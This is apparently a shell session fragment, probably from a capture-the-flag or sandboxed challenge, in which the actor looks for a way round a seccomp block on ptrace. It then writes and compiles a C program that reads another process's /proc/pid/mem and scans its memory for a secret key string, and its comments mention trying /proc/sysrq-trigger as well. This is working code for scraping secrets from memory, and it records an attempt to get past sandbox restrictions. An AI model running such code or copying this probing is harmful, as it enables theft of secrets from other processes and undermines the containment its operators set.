# ptrace is not permitted - seccomp or lack of CAP_SYS_PTRACE
# Let's check if we can read process memory through another route

# The app-worker binary has THESISKEY{%s} - it formats the key into this string
# Let's look at what the binary does when started - it outputs to pipe
# We know pipe:[23807] is its stdout

# Check if we can write a payload to host that dumps memory
# Let's use /proc/sysrq-trigger or similar

# Actually - let's try the /proc/pid/mem trick differently
# Try to open the mem file as root via the host path with Python using C

cat > /tmp/read_mem.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <string.h>
#include <errno.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    char mem_path[256], maps_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    // Try ptrace first
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == 0) {
        waitpid(pid, NULL, 0);
        printf("Ptrace attached!\n");
    } else {
        printf("Ptrace failed: %s\n", strerror(errno));
    }

    // Open mem
    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) {
        perror("open mem");
        return 1;
    }
    printf("Opened mem fd=%d\n", fd);

    // Read heap regions from maps
    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("maps");
        return 1;
    }

    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            if (perms[0] == 'r') {
                unsigned long size = end - start;
                if (size > 10*1024*1024) continue;

                char *buf = malloc(size);
                if (!buf) continue;

                if (lseek(fd, start, SEEK_SET) != start) {
                    free(buf);
                    continue;
                }

                ssize_t n = read(fd, buf, size);
                if (n > 0) {
                    char *p = buf;
                    while (p < buf + n - 10) {
                        if (memcmp(p, "THESISKEY{", 10) == 0) {
                            char *end_brace = strchr(p, '}');
                            if (end_brace) {
                                *end_brace = 0;
                                printf("FOUND: %s}\n", p);
                            }
                        }
                        p++;
                    }
                }
                free(buf);
            }
        }
    }
    fclose(maps);
    close(fd);

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == 0) {
        printf("Detached\n");
    }

    return 0;
}
EOF

gcc -o /tmp/read_mem /tmp/read_mem.c
